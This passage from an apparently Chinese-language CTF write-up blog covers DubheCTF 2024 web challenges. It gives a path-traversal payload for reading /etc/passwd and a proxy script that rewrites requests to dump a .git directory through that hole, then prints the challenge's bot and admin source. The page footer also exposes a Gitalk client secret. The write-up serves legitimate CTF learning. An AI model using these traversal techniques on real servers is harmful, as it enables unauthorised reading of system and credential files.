+<p>配置文件<br>关于 subconverter 主程序目录中 pref.ini 文件的解释，其余格式的配置文件不再赘述，与之相仿。</p>
+<p>注：本部分内容以本程序中的 <code>[pref.example.ini](https://github.com/tindy2013/subconverter/blob/master/base/pref.example.ini)</code> 或 <code>[pref.example.yml](https://github.com/tindy2013/subconverter/blob/master/base/pref.example.yml)</code> 或 <code>[pref.example.toml](https://github.com/tindy2013/subconverter/blob/master/base/pref.example.toml)</code> 为准，本文档可能由于更新不及时，内容不适用于新版本。<br>加载配置文件时会按照<code>pref.toml</code>、<code>pref.yml</code>、<code>pref.ini</code>的优先级顺序加载优先级高的配置文件</p>
+</blockquote>
+<p>经测试题目服务器使用的是pref.yml。<br>除此之外，&#x2F;getprofile还需要传入节点文件的文件名，毕竟就是要对这个文件的内容进行排序嘛，项目存在一个例子文件profiles&#x2F;example_profile.ini，经测试题目环境中也存在这个文件。           </p>
+<p><img src="/../images/sub.png" alt="sub"></p>
+<h3 id="VulnTagger"><a href="#VulnTagger" class="headerlink" title="VulnTagger"></a>VulnTagger</h3><blockquote>
+<p>未解决</p>
+</blockquote>
+<p>使用uvicorn做http服务，这是python aiohttp的http服务，前段时间有个洞可以任意文件读取。校赛出题的时候我出了一个web题就是用了这个洞。<br>payload：<code>/static/../../../../etc/passwd</code><br>存在.git    <code>/static/../../../.git</code><br>但是githacker等工具没办法通过目录穿越读.git。于是可以通过yakit代理，使用mitm热加载全自动修改githacker发的数据包，就能读.git<br>热加载脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hijackHTTPRequest = func(isHttps, url, req, forward /*func(modifiedRequest []byte)*/, drop /*func()*/) &#123;</span><br><span class="line">    if str.Contains(string(req), &quot;/.git&quot;) &#123;</span><br><span class="line">        modified = str.ReplaceAll(string(req), &quot;/.git&quot;, &quot;/static/../../../.git&quot;)</span><br><span class="line">        if str.Contains(modified, &quot;HEAD /static/../../../&quot;)&#123;</span><br><span class="line">            modified = str.Replace(modified, &quot;HEAD /static/../../../&quot;, &quot;GET /static/../../../&quot;, 1)</span><br><span class="line">        &#125;</span><br><span class="line">        forward(poc.FixHTTPResponse(modified))</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>得到源码后进行分析：           </p>
+<h4 id="bot-py"><a href="#bot-py" class="headerlink" title="bot.py"></a>bot.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> <span class="type">Callable</span></span><br><span class="line"><span class="keyword">from</span> logging <span class="keyword">import</span> getLogger</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> token_urlsafe</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Literal</span>, ParamSpec, TypeVar</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> httpx <span class="keyword">import</span> Client</span><br><span class="line"><span class="keyword">from</span> rich.logging <span class="keyword">import</span> RichHandler</span><br><span class="line"></span><br><span class="line">logger = getLogger(__name__)</span><br><span class="line">logger.addHandler(RichHandler())</span><br><span class="line">logger.setLevel(<span class="string">&quot;DEBUG&quot;</span>)</span><br><span class="line"></span><br><span class="line">client = Client(base_url=<span class="string">&quot;http://localhost:8080&quot;</span>)</span><br><span class="line"></span><br><span class="line">_PS = ParamSpec(<span class="string">&quot;_PS&quot;</span>)</span><br><span class="line">_R = TypeVar(<span class="string">&quot;_R&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">catch_exception</span>(<span class="params">func: <span class="type">Callable</span>[_PS, _R]</span>) -&gt; <span class="type">Callable</span>[_PS, _R | <span class="type">Literal</span>[<span class="literal">False</span>]]:</span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args: _PS.args, **kwargs: _PS.kwargs</span>) -&gt; _R | <span class="type">Literal</span>[<span class="literal">False</span>]:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logger.exception(e)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@catch_exception</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate</span>(<span class="params">difficulty: <span class="built_in">int</span> = <span class="number">4</span>, token: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span></span>):</span><br><span class="line">    resp = client.post(</span><br><span class="line">        <span class="string">&quot;/&quot;</span>,</span><br><span class="line">        headers=&#123;</span><br><span class="line">            <span class="string">&quot;x-pow-token&quot;</span>: (token := token <span class="keyword">or</span> token_urlsafe()),</span><br><span class="line">            <span class="string">&quot;x-pow-difficulty&quot;</span>: <span class="built_in">str</span>(difficulty),</span><br><span class="line">        &#125;,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> resp.status_code != <span class="number">418</span>:</span><br><span class="line">        logger.debug(<span class="string">&quot;Failed to validate with status code %d&quot;</span>, resp.status_code)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data: <span class="built_in">str</span> = resp.json()[<span class="string">&quot;bar&quot;</span>]</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        logger.debug(<span class="string">&quot;Failed to validate with invalid JSON&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        hashlib.sha256(token.encode() + data.encode())</span><br><span class="line">        .hexdigest()</span><br><span class="line">        .startswith(<span class="string">&quot;0&quot;</span> * difficulty)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    difficulty = <span class="number">4</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> validate(difficulty):  <span class="comment"># noqa: SIM102</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">all</span>(validate(difficulty) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(difficulty)):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        logger.info(<span class="string">&quot;Failed to validate with difficulty %d&quot;</span>, difficulty)</span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line">    logger.info(<span class="string">&quot;Successfully validated with difficulty %d&quot;</span>, difficulty)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> subprocess.Popen([<span class="string">&quot;/readflag&quot;</span>], stdout=subprocess.PIPE) <span class="keyword">as</span> proc:</span><br><span class="line">        <span class="keyword">assert</span> proc.stdout <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> proc.stdout:</span><br><span class="line">            flag = line.decode().strip()</span><br><span class="line">            validate(difficulty, flag)</span><br><span class="line">    logger.info(<span class="string">&quot;Flag submitted&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>bot会读取flag然后发往<a target="_blank" rel="noopener" href="http://localhost:8080/%E3%80%82%E4%BD%86%E5%A5%87%E6%80%AA%E7%9A%84%E6%98%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A0%B9%E6%9C%AC%E6%B2%A1%E6%9C%89%E7%9B%B8%E5%85%B3%E5%A4%84%E7%90%86%E9%80%BB%E8%BE%91%EF%BC%8C%E8%80%8Chttp">http://localhost:8080/。但奇怪的是服务器根本没有相关处理逻辑，而http</a> code 418也是一个不存在的状态码。</p>
+<h4 id="admin-py"><a href="#admin-py" class="headerlink" title="admin.py"></a>admin.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> logging <span class="keyword">import</span> getLogger</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> environ</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> compare_digest</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> Annotated</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> Depends, HTTPException</span><br><span class="line"><span class="keyword">from</span> fastapi.security <span class="keyword">import</span> HTTPBasic, HTTPBasicCredentials</span><br><span class="line"><span class="keyword">from</span> nicegui <span class="keyword">import</span> app, events, ui</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ..loader <span class="keyword">import</span> ModelLoader</span><br><span class="line"></span><br><span class="line">logger = getLogger(__name__)</span><br><span class="line"></span><br><span class="line">PASSWORD_SALT = <span class="string">&quot;subscribe_taffy_thanks_meow!&quot;</span></span><br><span class="line">SALTED_PASSWORD = environ.get(<span class="string">&quot;SALTED_PASSWORD&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CredentialsDep = Annotated[</span><br><span class="line">    HTTPBasicCredentials | <span class="literal">None</span>,</span><br><span class="line">    Depends(HTTPBasic(auto_error=<span class="literal">False</span>)),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">authorization_middleware</span>(<span class="params">credentials: CredentialsDep</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> SALTED_PASSWORD:</span><br><span class="line">        logger.warning(</span><br><span class="line">            <span class="string">&quot;SALTED_PASSWORD not set, you will not be able to access admin page&quot;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> credentials <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> (</span><br><span class="line">        compare_digest(credentials.username, <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">        <span class="keyword">and</span> compare_digest(</span><br><span class="line">            hashlib.sha256(</span><br><span class="line">                <span class="string">f&quot;<span class="subst">&#123;PASSWORD_SALT&#125;</span><span class="subst">&#123;credentials.password&#125;</span><span class="subst">&#123;PASSWORD_SALT&#125;</span>&quot;</span>.encode()</span><br><span class="line">            ).hexdigest(),</span><br><span class="line">            SALTED_PASSWORD,</span><br><span class="line">        )</span><br><span class="line">    ):</span><br><span class="line">        app.storage.browser[<span class="string">&quot;is_admin&quot;</span>] = <span class="literal">True</span></span><br><span class="line">    is_admin = app.storage.browser.get(<span class="string">&quot;is_admin&quot;</span>, <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_admin:</span><br><span class="line">        <span class="keyword">raise</span> HTTPException(</span><br><span class="line">            status_code=<span class="number">401</span>,</span><br><span class="line">            detail=<span class="string">&quot;Unauthorized&quot;</span>,</span><br><span class="line">            headers=&#123;<span class="string">&quot;WWW-Authenticate&quot;</span>: <span class="string">&quot;Basic&quot;</span>&#125;,</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> is_admin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AuthorizationMiddlewareDep = Annotated[</span><br><span class="line">    <span class="built_in">bool</span>,</span><br><span class="line">    Depends(authorization_middleware),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@ui.page(<span class="params"><span class="string">&quot;/admin&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_page</span>(<span class="params">is_admin: AuthorizationMiddlewareDep</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle_upload</span>(<span class="params">e: events.UploadEventArguments</span>):</span><br><span class="line">        name = <span class="built_in">str</span>.strip(model_name_input.value)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> name:</span><br><span class="line">            ui.notify(<span class="string">&quot;Please input a valid model name&quot;</span>, color=<span class="string">&quot;negative&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(ModelLoader.pts_path / <span class="string">f&quot;<span class="subst">&#123;name&#125;</span>.pt&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            total = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> chunk <span class="keyword">in</span> e.content:</span><br><span class="line">                total += f.write(chunk)</span><br><span class="line">        logger.debug(<span class="string">f&quot;New model <span class="subst">&#123;name=&#125;</span> uploaded, <span class="subst">&#123;total&#125;</span> bytes&quot;</span>)</span><br><span class="line">        ui.<span class="built_in">open</span>(admin_page)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> ui.dialog() <span class="keyword">as</span> upload_dialog, ui.card():</span><br><span class="line">        <span class="keyword">with</span> ui.card_section():</span><br><span class="line">            ui.label(<span class="string">&quot;Upload Model&quot;</span>).classes(<span class="string">&quot;text-h6&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> ui.card_section(), ui.column().classes(<span class="string">&quot;items-stretch&quot;</span>):</span><br><span class="line">            model_name_input = ui.<span class="built_in">input</span>(</span><br><span class="line">                <span class="string">&quot;Model Name&quot;</span>,</span><br><span class="line">                validation=&#123;</span><br><span class="line">                    <span class="string">&quot;Please input a valid filename.&quot;</span>: <span class="keyword">lambda</span> value: re.fullmatch(</span><br><span class="line">                        <span class="string">r&quot;^[a-zA-Z0-9_\-]+$&quot;</span>, value</span><br><span class="line">                    )</span><br><span class="line">                    <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">                &#125;,</span><br><span class="line">            )</span><br><span class="line">            ui.upload(label=<span class="string">&quot;Model File&quot;</span>, auto_upload=<span class="literal">True</span>, on_upload=handle_upload)</span><br><span class="line">            ui.button(<span class="string">&quot;Cancel&quot;</span>, on_click=upload_dialog.close).props(<span class="string">&quot;flat&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> ui.row().classes(</span><br><span class="line">        <span class="string">&quot;w-full absolute-center justify-center items-center&quot;</span></span><br><span class="line">    ), ui.card().classes(<span class="string">&quot;col-12 col-md-10 col-xl-8&quot;</span>):</span><br><span class="line">        <span class="keyword">with</span> ui.card_section(), ui.row():</span><br><span class="line">            ui.label(<span class="string">&quot;Welcome, Admin!&quot;</span>).classes(<span class="string">&quot;text-h5&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> ui.card_section(), ui.column().classes(<span class="string">&quot;items-stretch&quot;</span>):</span><br><span class="line">            <span class="keyword">for</span> index, (model_name, _) <span class="keyword">in</span> <span class="built_in">enumerate</span>(</span><br><span class="line">                ModelLoader.available_pts().items()</span><br><span class="line">            ):</span><br><span class="line">                splitter = ui.splitter(horizontal=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">with</span> splitter.before, ui.row().classes(</span><br><span class="line">                    <span class="string">&quot;items-center justify-between q-mb-md&quot;</span></span><br><span class="line">                ):</span><br><span class="line">                    ui.label(<span class="string">f&quot;<span class="subst">&#123;index+<span class="number">1</span>&#125;</span>. Model:&quot;</span>).classes(<span class="string">&quot;text-body1&quot;</span>)</span><br><span class="line">                    ui.label(model_name).classes(<span class="string">&quot;text-body2 font-mono&quot;</span>)</span><br><span class="line">                    ui.button(</span><br><span class="line">                        <span class="string">&quot;Delete&quot;</span>,</span><br><span class="line">                        icon=<span class="string">&quot;delete&quot;</span>,</span><br><span class="line">                        color=<span class="string">&quot;negative&quot;</span>,</span><br><span class="line">                        on_click=<span class="keyword">lambda</span> e: (</span><br><span class="line">                            ModelLoader.delete_model(model_name),  <span class="comment"># noqa: B023</span></span><br><span class="line">                            ui.<span class="built_in">open</span>(admin_page),</span><br><span class="line">                        ),</span><br><span class="line">                    ).props(<span class="string">&quot;flat&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> ui.card_actions():</span><br><span class="line">            ui.button(<span class="string">&quot;Upload Model&quot;</span>, icon=<span class="string">&quot;upload&quot;</span>, on_click=upload_dialog.<span class="built_in">open</span>)</span><br><span class="line">            ui.button(<span class="string">&quot;Refresh&quot;</span>, icon=<span class="string">&quot;refresh&quot;</span>, on_click=<span class="keyword">lambda</span> e: ui.<span class="built_in">open</span>(admin_page))</span><br></pre></td></tr></table></figure>
+<p>访问&#x2F;admin时会读取环境变量里的哈希后的password。但奇怪的是无论是&#x2F;proc&#x2F;self&#x2F;envrion和.env文件都读不到哈希后的password。<br>可以读&#x2F;proc&#x2F;self&#x2F;maps。<br>在&#x2F;static读任意文件的时候，可以通过range header头指定读取多少字节，感觉可以通过&#x2F;proc&#x2F;self&#x2F;mem读内存去拿各种key什么的。<br>但mem fd等读取的时候报500错误，可能是没权限读取，到这卡住了，怀疑读.git时没读完整。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/write-up/" rel="tag"># write up</a>
+              <a href="/tags/DubheCTF-2024/" rel="tag"># DubheCTF 2024</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/02/27/bi0s-CTF-2024-wp/" rel="prev" title="bi0s CTF 2024 wp">
+      <i class="fa fa-chevron-left"></i> bi0s CTF 2024 wp
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Wecat"><span class="nav-number">1.0.1.</span> <span class="nav-text">Wecat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Master-of-Profile"><span class="nav-number">1.0.2.</span> <span class="nav-text">Master of Profile</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VulnTagger"><span class="nav-number">1.0.3.</span> <span class="nav-text">VulnTagger</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#bot-py"><span class="nav-number">1.0.3.1.</span> <span class="nav-text">bot.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#admin-py"><span class="nav-number">1.0.3.2.</span> <span class="nav-text">admin.py</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Zoiltin</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Zoiltin</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+<script src="https://cdn.jsdelivr.net/npm/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>
+
+<script>
+var options = {
+  bottom: '64px',
+  right: 'unset',
+  left: '32px',
+  time: '0.5s',
+  mixColor: 'transparent',
+  backgroundColor: 'transparent',
+  buttonColorDark: '#100f2c',
+  buttonColorLight: '#fff',
+  saveInCookies: true,
+  label: '🌓',
+  autoMatchOsTheme: true
+}
+const darkmode = new Darkmode(options);
+window.darkmode = darkmode;
+darkmode.showWidget();
+</script>
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : '5d255510a11e0afdd868',
+      clientSecret: '8252d818d311dbc47b2db2b855e02cb69df60cbd',
+      repo        : 'BlogComments',
+      owner       : 'zoiltin',
+      admin       : ['zoiltin'],
+      id          : '08264b1bbb7a294d7b751ab7737c60ee',
+        language: 'ch-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
